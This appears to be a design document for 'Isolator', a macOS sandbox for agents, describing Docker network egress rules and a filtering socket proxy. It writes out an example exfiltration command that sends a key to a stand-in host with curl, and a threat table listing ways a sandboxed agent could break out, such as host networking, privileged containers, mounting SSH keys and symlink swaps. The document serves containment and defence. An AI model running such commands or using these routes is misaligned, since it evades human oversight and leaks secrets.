# Docker Network Security in Isolator

## The Problem

Isolator uses macOS `pf` firewall rules to restrict network access per user (by UID).
This works for host processes — but **not for Docker containers**.

On macOS, Docker runs inside a Linux VM (OrbStack or Docker Desktop).
Container traffic exits through the VM's network stack, not through a macOS process.
The `pf` firewall never sees it.

This means: a sandboxed agent can run `docker run alpine curl https://evil.com/?key=...`
and bypass all network isolation.

## The Solution: Docker Network + iptables

We create **per-user Docker networks** with **iptables egress rules** inside the Docker VM.

### Two layers

| Layer | Where | Restricts |
|-------|-------|-----------|
| macOS `pf` | Host kernel | Host processes (by UID) |
| Docker `iptables` | OrbStack VM | Container traffic (by subnet) |

### How it works

1. `iso create <name>` creates a Docker network `iso-<name>` with a dedicated subnet
2. `iso pf` generates iptables rules in the `DOCKER-USER` chain inside the OrbStack VM
3. Container traffic from that subnet is restricted to:
   - Other containers on the same network (container-to-container)
   - DNS (UDP port 53)
   - Whitelisted IPs from `config.toml` (same hosts list as pf)
4. All other egress is dropped

### Rule structure (DOCKER-USER chain)

```
# Per-user rules
ACCEPT  all  172.30.0.0/24 → 172.30.0.0/24     (container-to-container)
ACCEPT  udp  172.30.0.0/24 → 0.0.0.0/0 :53     (DNS)
ACCEPT  tcp  172.30.0.0/24 → <allowed-ips> :443 (whitelisted hosts)
DROP    all  172.30.0.0/24 → 0.0.0.0/0          (block everything else)

# Repeat for each user's subnet...

# Default: allow all other Docker traffic
ACCEPT  all  0.0.0.0/0 → 0.0.0.0/0
```

### What works and what doesn't

| Operation | Works? | Why |
|-----------|--------|-----|
| `docker pull` | Yes | Daemon operation, not container traffic |
| Container-to-container | Yes | Same subnet, allowed by rule |
| Container → whitelisted host | Yes | Explicitly allowed |
| Container → internet | **No** | Dropped by iptables |
| Container `curl evil.com` | **No** | Dropped by iptables |
| Container `apt-get install` | **No** | Dropped (build images before, not during run) |

### Image pulls

`docker pull` is a **daemon** operation — the Docker daemon downloads layers using its
own network, not the container's. Image pulls work regardless of container network
restrictions.

Build images with `docker build` (also a daemon operation) before starting containers.
Don't rely on runtime `apt-get install` inside containers.

### Applying rules

```bash
iso pf                # generates both macOS pf rules AND Docker iptables rules
iso pf --dry-run      # prints both without applying
```

The `iso pf` command:
1. Resolves hostnames to IPs (same as before)
2. Writes macOS pf anchor (same as before)
3. Generates iptables rules for Docker VM
4. Applies them via `nsenter` into Docker's network namespace

### Per-user Docker networks

Each user gets a network with a predictable subnet:

| User | Subnet | Network name |
|------|--------|-------------|
| acm | 172.30.0.0/24 | iso-acm |
| click | 172.30.1.0/24 | iso-click |
| tools | 172.30.2.0/24 | iso-tools |

Subnets are derived from the user's position in config (0-based index × /24).

### Using the network

The `DOCKER_NETWORK` environment variable is set in the user's profile:

```bash
export DOCKER_NETWORK=iso-acm
```

Docker Compose reads `DOCKER_NETWORK` if configured, or users can specify:

```yaml
networks:
  default:
    external: true
    name: ${DOCKER_NETWORK:-bridge}
```

### Limitations

- Rules are applied to the Docker VM, not to macOS. If the Docker VM is restarted,
  rules are lost. Re-run `iso pf` after OrbStack restart.
- The `nsenter` approach requires the `nicolaka/netshoot` image (pulled automatically).
- Container DNS resolution works, but the resolved IPs may not be in the whitelist.
  Use IP-based whitelisting or pre-resolve in `iso pf`.

## Docker socket proxy (per-user)

Sandbox users **cannot** reach Docker daemon directly. Each user gets a
filtered socket at `/var/run/isolator-docker/<user>.sock` that proxies
requests to OrbStack's socket (`~/.orbstack/run/docker.sock`, inside admin's
chmod 700 home — sandbox users can't traverse).

The proxy enforces (in `bin/docker-proxy`):
- Bind mounts: only `/Users/Workspaces/<user>/` (paths rewritten via realpath)
- NetworkMode: only `bridge` or `iso-<user>`
- Rejects: `Privileged`, `--net=host`, `--pid=host`, `--volumes-from`, `--device`,
  `CapAdd`, `SecurityOpt`, `IpcMode`, `UTSMode`, `UsernsMode`, `CgroupnsMode`,
  `CgroupParent`, `Runtime`, `Sysctls`, `Ulimits`, `OomScoreAdj`, `OomKillDisable`,
  `DeviceCgroupRules`, `DeviceRequests`, explicit User=root
- Rejects: `Transfer-Encoding` and duplicate `Content-Length` (HTTP smuggling)

There is **no `/var/run/docker.sock` hardlink**. Sandbox users only have
the per-user proxy socket; no fallback path to the real daemon.

## Security model with Docker

| Threat | Mitigation |
|--------|-----------|
| Agent exfiltrates via host curl | macOS `pf` blocks by UID |
| Agent exfiltrates via Docker container | Docker `iptables` blocks by subnet |
| Agent uses `--net=host`, `--privileged`, etc. | Proxy rejects dangerous HostConfig |
| Agent mounts `/Users/admin/.ssh` | Proxy rejects mounts outside workspace |
| Agent swaps symlink mid-validation (TOCTOU) | Proxy rewrites paths to realpath |
| Agent creates unrestricted Docker network | NetworkMode allowlist; iptables drops 172.17.0.0/16 |
| Agent connects directly to docker.sock | No /var/run/docker.sock; OrbStack socket inside admin home |
| Container runtime installs malware | Egress blocked unless host whitelisted |
| Agent reads other user's containers | Docker namespacing (shared daemon caveat) |
